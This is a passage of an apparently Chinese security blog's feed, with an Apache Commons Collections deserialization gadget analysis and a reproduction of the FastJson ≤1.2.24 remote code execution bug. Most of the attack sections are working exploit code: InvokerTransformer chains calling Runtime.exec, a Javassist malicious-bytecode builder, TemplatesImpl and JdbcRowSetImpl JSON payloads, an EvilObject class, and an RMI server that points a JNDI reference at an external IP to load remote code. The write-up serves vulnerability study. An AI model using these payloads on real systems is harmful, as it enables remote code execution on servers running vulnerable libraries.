<li>Redis未授权shell利用方式分析<a href="http://blog.leanote.com/post/snowming/2d9a2082c02b" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/2d9a2082c02b</a></li>
</ul>
]]></content>
      <categories>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Commons Collections分析</title>
    <url>/2020/04/20/common-collections/</url>
    <content><![CDATA[<p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。这个组件出现反序列化问题，由于很多类引起的。这里介绍其中一种方式的原理，与<font color=#008000><code>TransformedMap</code></font>和<font color=#008000><code>InvokerTransformer</code></font>有关。</p>
<a id="more"></a>



<h2 id="关键类介绍"><a href="#关键类介绍" class="headerlink" title="关键类介绍"></a>关键类介绍</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformerdMap</code>这个类是用来对Map进行某些变换用的。当一个元素被<font color=ff0000><code>添加/删除/修改</code></font>过时，会自动调用<code>tranform</code>方法自动进行特定的修饰变换，变换的逻辑由Transformer类定义。</p>
<p>通过decorate函数可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map transformedMap &#x3D; TransformedMap.decorate(map,keyTansformer,valueTransformer);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第二个参数和第三个参数分别对应于当Map中的key和value改变时需要做的操作。</p>
</blockquote>
<h3 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h3><p><code>Transformer</code>是一个接口，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，上述代码若修改了其中的任意key或value，都会调用<code>tranform</code>方法进行变换操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">	new ConstantTransformer(...);</span><br><span class="line">	new InvokerTransformer(...)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">Map transMap &#x3D; TransformedMap.decorate(rawMap,null,chainedTransformer);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>若想进行一系列的变换操作，可以通过定义一个chainedTransformer来实现，只需要传入一个Transformer数组即可。</p>
</blockquote>
<p>ChainedTranformer的工作原理很简单，将上一个变换的结果作为下一次变换的输入，直到左右的变换完成，并返回最终的object。Commons Collections内置了许多常见的transformer，无需手工编写，其中InvokerTransformer可以通过调用Java反射机制来调用任意函数。</p>
<h2 id="构造chainedTransformer"><a href="#构造chainedTransformer" class="headerlink" title="构造chainedTransformer"></a>构造chainedTransformer</h2><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>相当于<code>Transformer</code>的一种。观察它的<code>tranform</code>函数，如下所示:</p>
<p>org/apache/commons/collections/functors/InvokerTransformer.class<br><img src="1.png" alt=""></p>
<p>从图上可知，关键部分在于通过<code>getClass()</code>、<code>getMethod()</code>以及<code>invoke()</code>来进行反射，查找并调用给定的方法。InvokerTransformer接受3个参数，分别是调用方法的名称，参数类型，调用参数。参数类型要对应于调用方法所指定的参数类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>内置的<code>ConstantTranformer</code>类可以获取到特定的类。<br><img src="2.png" alt=""></p>
<h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>在构造的chain中，最终的实现类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;)</span><br></pre></td></tr></table></figure>

<p>因此第一步是获取到Runtime类，通过内置的<code>ConstantTransformer</code>来获取，然后通过<code>InvokerTransformer</code>来反射调用getMethod方法，参数是getRuntime，以此来获取到<code>Runtime.getRuntime</code>。以此类推，构造出调用invoke和exec的<code>InvokerTransformer</code>，整个chain就结束了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformChain &#x3D; new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>构造完这样的一个chain之后，只需要将一个<code>Map</code>类型的数据转换为<code>TransformedMap</code>，然后对其中的key,value进行操作，即可达到反序列化命令执行。可新建一个test.java进行测试。</p>
<p>test.java</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">	Transformer transformedChain &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">	Map&lt;String,String&gt; beforetransMap &#x3D; new HashMap&lt;String,String&gt;();</span><br><span class="line">	beforetransMap.put(&quot;name&quot;,&quot;ananaskr&quot;);</span><br><span class="line">        </span><br><span class="line">	Map transformedMap &#x3D; TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line"></span><br><span class="line">	Map.Entry onlyElement &#x3D; (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(&quot;ananaskr1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下:<br><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">Apache-Commons-Collections反序列化漏洞分析</a></li>
<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
  </entry>
  <entry>
    <title>FastJson反序列化回顾系列(一)</title>
    <url>/2020/05/10/fastjson-1/</url>
    <content><![CDATA[<p>FastJson是一个由alibaba维护的json库，应用范围很广。2017年3月15日由官方发布最早的<a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315" target="_blank" rel="noopener">安全公告</a>。该公告表示FastJson在1.2.24及之前版本存在远程代码执行漏洞。紧接着于4月29日出现相关POC。这篇文章就是来分析复现这一漏洞。</p>
<a id="more"></a>

<p>整个复现系列的payload放在了<a href="https://github.com/ananaskr/FastJson_Payload/tree/master/project/src/main/java" target="_blank" rel="noopener">github</a>上。</p>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>fastjson &lt;=1.2.24</li>
</ul>
<h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><p>漏洞产生的原因是由于fastjson反序列化Json字符串为Java对象时autoType没有做正确的检测处理。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ul>
<li>TemplatesImpl类</li>
<li>JNDI注入-JdbcRowSetImpl类</li>
</ul>
<h1 id="利用链分析之TemplatesImpl类"><a href="#利用链分析之TemplatesImpl类" class="headerlink" title="利用链分析之TemplatesImpl类"></a>利用链分析之TemplatesImpl类</h1><h2 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h2><ul>
<li>1.2.22 &lt;= fastjson &lt;= 1.2.24</li>
</ul>
<blockquote>
<p>本来公告中表明的是FastJson在1.2.24及之前版本存在远程代码执行漏洞，但是由于此利用方式需要用到<code>Feature.SupportNonPublicField</code>属性，而该属性在1.2.22版本之后才开始提供相应的支持。</p>
</blockquote>
<h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>该反序列化漏洞利用链之前分析过的CommonsBeanUtils1中的后半部分payload，即利用TemplatesImpl类的<font color=#008000><code>getOutputProperties()</code></font>函数，调用到newTransformer()，从而RCE。之前利用commons-beanutils中的BeanComparator.compare()方法调用到getOutputProperties()的方法显然是行不通的。那么在这里，我们要解决的问题就是如何调用getOutputProperties()。</p>
<p>如果了解FastJson的反序列化，那么就很容易知道通过TemplatesImpl类成员变量<font color=#008000><code>_outputProperties</code></font>来自动调用<font color=#008000><code>getOutputProperties()</code></font>。如果不了解其反序列化，可以看这篇<a href="">文章</a>。</p>
<p>而在后续的过程中会用到_bytecodes中存放的恶意代码，因此_bytecodes必须是能够被反序列化的。来看看_bytecodes在TemplatesImpl中的情况。</p>
<p><img src="1.png" alt=""></p>
<p><img src="2.png" alt=""></p>
<p>它是一个私有属性，按理来说，它有一个setter方法，不知道是不是由于setter是个私有方法，所以不能被序列化。在这里要想_bytecodes被反序列化，需要设定parseObject()函数的参数<code>Feature.SupportNonPublicField</code>。  </p>
<p>接下来需要满足的条件就是需要能够调用到getOutputProperties()。这个getter方法正好满足p0’s师傅文章中所写的条件。FastJson会对满足下列要求的getter进行调用。</p>
<ul>
<li>只有getter没有setter</li>
<li>函数名称大于4</li>
<li>非静态函数</li>
<li>函数名称以get起始，且第四个字符为大写字母</li>
<li>函数没有入参</li>
<li>继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong</li>
</ul>
<p>来看看getOutputProperties()的情况。</p>
<p><img src="3.png" alt=""></p>
<p>它是一个Properties类，它继承自Hashtable，Hashtable又继承自Map。因此满足条件。</p>
<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>首先可以通过前面Javassist的方式生成恶意的字节码。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//in main()</span></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后获取TemplatesImpl.class，构造出序列化JSON数据，如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br></pre></td></tr></table></figure>

<p>在实际利用时，不能直接将获取的字节码转换为字符串进行拼接，而是需要经过一个base64编码变成字符串进行拼接。这个问题会在后面的细节问题中作出解释。</p>
<p>完整的demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line">        </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line">        </span><br><span class="line">        Object res = JSON.parseObject(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后的结果如下所示:</p>
<p><img src="4.png" alt=""></p>
<h2 id="漏洞利用细节"><a href="#漏洞利用细节" class="headerlink" title="漏洞利用细节"></a>漏洞利用细节</h2><h3 id="01-outputProperties如何与getOutputProperties-关联起来？"><a href="#01-outputProperties如何与getOutputProperties-关联起来？" class="headerlink" title="01._outputProperties如何与getOutputProperties()关联起来？"></a>01._outputProperties如何与getOutputProperties()关联起来？</h3><p>可以看到_outputProperties成员变量和getter方法getOutputProperties()之间相差了一个<font color=#008000><code>_</code></font>字符。是如何关联起来的呢？</p>
<p>这是由JavaBeanInfo.build进行处理的，FastJson会创建一个fieldList数组，用于保存目标Java类的成员变量以及相应的setter或getter方法，以供反序列化字段时调用。</p>
<p>FastJson会对setter、getter、成员变量分别进行处理，智能提取出成员变量信息。逻辑如下:</p>
<ol>
<li>识别setter方法名，并根据setter方法名提取出成员变量名。</li>
<li>通过clazz.getFields()获取成员变量。</li>
<li>识别getter方法名，并根据getter方法名提取出成员变量名。</li>
</ol>
<p>定位到JavaBeanInfo.build()函数中，来看一下，它是如何从getter方法中提取出成员变量的。可以看到，它是将第4个字符变成小写，然后拼接上后面的字符。</p>
<p><img src="6.png" alt=""></p>
<p>此时在fieldList中存入的是outputProperties与getOutputProperties之间的对应关系。还是没有对应上_outputProperties。继续看，接下来FastJson会语义分析JSON字符串。定位到JavaBeanDeserializer.parseField()函数</p>
<p><img src="7.png" alt=""></p>
<p>这里的key为_outputProperties。这里跟进一下smartMatch(key)。</p>
<p><img src="8.png" alt=""></p>
<p>这里会将_outputProperties这个成员变量与outputProperties相关联，从而也就与getOutputProperties()相关联了。</p>
<h3 id="02-为什么要对-bytecodes进行Base64编码"><a href="#02-为什么要对-bytecodes进行Base64编码" class="headerlink" title="02.为什么要对_bytecodes进行Base64编码?"></a>02.为什么要对_bytecodes进行Base64编码?</h3><p>在以往的情况下，并不需要对_bytecodes进行Base64编码。而我在newTransformer()函数中发现_bytecodes确实是Base64解码后字节码。那么是在什么地方进行了解码呢？</p>
<p>定位到ObjectArrayCodec.deserialze()</p>
<p><img src="9.png" alt=""></p>
<p>然后跟进byteValue()</p>
<p><img src="10.png" alt=""></p>
<p>在这里进行了base64解码。</p>
<h1 id="利用链分析之JNDI注入"><a href="#利用链分析之JNDI注入" class="headerlink" title="利用链分析之JNDI注入"></a>利用链分析之JNDI注入</h1><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>由于此利用方式需要用到JNDI注入，对此不了解的可以先了解一下。此次利用JNDI注入需要满足2个条件:</p>
<ol>
<li>存在有漏洞的代码(即lookup(uri)，且uri可控)</li>
<li>Java版本(&lt;=jdk1.8_113) (RMI利用方式)</li>
</ol>
<p>有趣的是，第一点条件可利用<code>com.sun.rowset.JdbcRowSetImpl</code>类完成。定位到JdbcRowSetImpl类，搜索lookup函数，直接定位到<code>connect()</code>函数。</p>
<p><img src="3-1.png" alt=""></p>
<p>可以看到是很完美的漏洞触发代码，那么需要知道<code>this.getDataSourceName()</code>是否可控。跟进它。它取自<code>BaseRowSet</code>类的getDataSourceName()函数，且dataSource是个私有变量，可以通过其setter函数进行赋值。</p>
<p><img src="4-1.png" alt=""><br><img src="5-1.png" alt=""><br><img src="6-1.png" alt=""></p>
<p>而JdbcRowSetImpl类继承自BaseRowSet类，且重写了setDataSourceName()函数，定位到这个函数。</p>
<p><img src="7-1.png" alt=""></p>
<p>它会调用其父类即BaseRowSet类的setDataSourceName()函数，从而给dataSource赋值。</p>
<p>到这里为止，uri也可控了。但由于上述的connect()是protected类型的，不能直接被访问。所以找到了该类的setAutoCommit()函数。如下所示:</p>
<p><img src="8-1.png" alt=""></p>
<p>到这里，JdbcRowSetImpl类提供了一个可以进行JNDI注入的入口点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">        jdbcRowSet.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);</span><br><span class="line">        jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="EXP构造-1"><a href="#EXP构造-1" class="headerlink" title="EXP构造"></a>EXP构造</h3><p>因此，在进行fastjson反序列化时，需要调用该类的setDataSourceName函数和setAutoCommit函数。那么构造payload传入了<code>dataSourceName</code>变量和<code>autoCommit</code>值。</p>
<p>而实际上，在JdbcRowSetImpl类中并没有这两个成员变量，但传入的payload中若有这2个变量，便可调用对应的setter方法。非常神奇的一点认识。不过联想到fastjson反序列化时获取成员变量的一套逻辑，便可以想通了。</p>
<p>因此payload为:</p>
<font color=#008000>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">	&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;&quot;,</span><br><span class="line">	&quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</font>

<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先在web服务器上放入恶意的class文件。在所在目录下利用php内置服务器起一下(<code>php -S 0.0.0.0:2333</code>)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Runtime rt = Runtime.getRuntime();</span><br><span class="line">        String[] commands = &#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"open /Applications/Calculator.app"</span>&#125;;</span><br><span class="line">        rt.exec(commands);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>然后起一个rmi服务。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server_rmi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        String FactoryURL = <span class="string">"http://101.200.144.143:2333/"</span>;</span><br><span class="line">        Reference evilObj = <span class="keyword">new</span> Reference(<span class="string">"EvilObject"</span>,<span class="string">"EvilObject"</span>,FactoryURL);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(evilObj);</span><br><span class="line">        registry.bind(<span class="string">"EvilObject"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整的客户端demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.22-1.2.24&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在JDK1.8_111环境下，运行的结果如下图所示:</p>
<p><img src="9-1.png" alt=""></p>
<h2 id="PropertyPathFactoryBean"><a href="#PropertyPathFactoryBean" class="headerlink" title="PropertyPathFactoryBean"></a>PropertyPathFactoryBean</h2><p>利用此类在fastjson反序列化过程中进行JNDI注入需要依赖于以下的第三方包</p>
<ul>
<li>spring-beans</li>
<li>spring-context</li>
<li>spring-core</li>
</ul>
<p>在正式开始分析之前，首先介绍一个在spring-context中类<code>org.springframework.jndi.JndiTemplate</code>。它是spring里面用来简化对JNDI的操作的类，提供了lookup、bind方法。来看看它的lookup方法。</p>
<p><img src="1-2.png" alt=""></p>
